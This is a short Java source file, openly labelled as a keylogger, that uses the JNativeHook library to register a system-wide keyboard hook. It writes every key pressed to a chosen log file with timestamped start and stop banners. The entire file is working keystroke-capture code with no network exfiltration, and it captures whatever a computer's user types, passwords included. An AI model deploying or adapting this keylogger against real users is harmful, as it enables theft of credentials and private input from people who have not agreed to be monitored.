/*
 *
 * =========================================================================================
 *  Copyright (C) 2019-2021
 *
 *  AM-Design-Development - (Alessio Moraschini)
 * =========================================================================================
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file
 * except in compliance with the License. You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software distributed under the
 * License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND,
 * either express or implied. See the License for the specific language governing permissions
 * and limitations under the License.
 */
package keylogger;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLog implements NativeKeyListener{
	
	// Fields
	File output;
	FileWriter fileOutStream;
	
	// Constructor
	public KeyLog() {

	}
	
	// Methods
	public void startLogger(File out) throws IOException {
		
		Date now = new Date();
		output = out;
		
		try {
			SimpleDateFormat df = new SimpleDateFormat("dd_MM_YYYY_@HH:mm:ss");
			String msg = "\n#######################################################################\n -> I'm Started :D "+df.format(now)+" \n#######################################################################\n\n ";
			fileOutStream = new FileWriter(out, true);
			fileOutStream.write(msg);
			
			GlobalScreen.registerNativeHook();
			fileOutStream.flush();
		
		}catch(NativeHookException e) {
			
			String errMsg = Arrays.toString(e.getStackTrace());
			System.out.println(errMsg);
			fileOutStream.write(errMsg);
			fileOutStream.close();
		}	
//		} catch (FileNotFoundException e) {
//			
//			String errMsg = Arrays.toString(e.getStackTrace());
//			System.out.println(errMsg);
//			fileOutStream.close();
//		}
		 GlobalScreen.addNativeKeyListener(this);
		 System.out.println("Started :)");
	}
	
	public void releaseResources() {
		try {
			GlobalScreen.removeNativeKeyListener(this);
			SimpleDateFormat df = new SimpleDateFormat("dd_MM_YYYY_@HH:mm:ss");
			String msg = "\n#######################################################################\n -> CLOSING LOGGER "+df.format(new Date())+" \n#######################################################################\n\n ";
			fileOutStream.write(msg);
			
			fileOutStream.flush();
			fileOutStream.close();
		}catch (Exception e) {
			System.out.println("Error closing file stream");
			e.printStackTrace();
		}
	}

	public void nativeKeyPressed(NativeKeyEvent arg0) {
		
		String keyPressed = NativeKeyEvent.getKeyText(arg0.getKeyCode());
		
			try {
				if(keyPressed.length()>1 || keyPressed.equals("\n")) {
					keyPressed=keyPressed+"\n";
				}
				fileOutStream.write(keyPressed);
				System.out.println(keyPressed);
				fileOutStream.flush();
			} catch (IOException e) {
				String errMsg = Arrays.toString(e.getStackTrace());
				System.out.println(errMsg);
			} 
		
	}

	public void nativeKeyReleased(NativeKeyEvent arg0) {
//		String keyPressed = NativeKeyEvent.getKeyText(arg0.getKeyCode());
//		if (keyPressed.length()==1) {
//			try {
//				fileOutStream.write(keyPressed);
//				fileOutStream.flush();
//			} catch (IOException e) {
//				String errMsg = Arrays.toString(e.getStackTrace());
//				System.out.println(errMsg);
//			} 
//		}
	}

	public void nativeKeyTyped(NativeKeyEvent arg0) {
//		char keyPressed = arg0.getKeyChar();
//		
//			try {
//				fileOutStream.write(keyPressed);
//				fileOutStream.flush();
//			} catch (IOException e) {
//				String errMsg = Arrays.toString(e.getStackTrace());
//				System.out.println(errMsg);
//			} 
	}

	public File getOutput() {
		return output;
	}

	public void setOutput(File output) {
		this.output = output;
	}

	public FileWriter getFileOutStream() {
		return fileOutStream;
	}

	public void setFileOutStream(FileWriter fileOutStream) {
		this.fileOutStream = fileOutStream;
	}

}

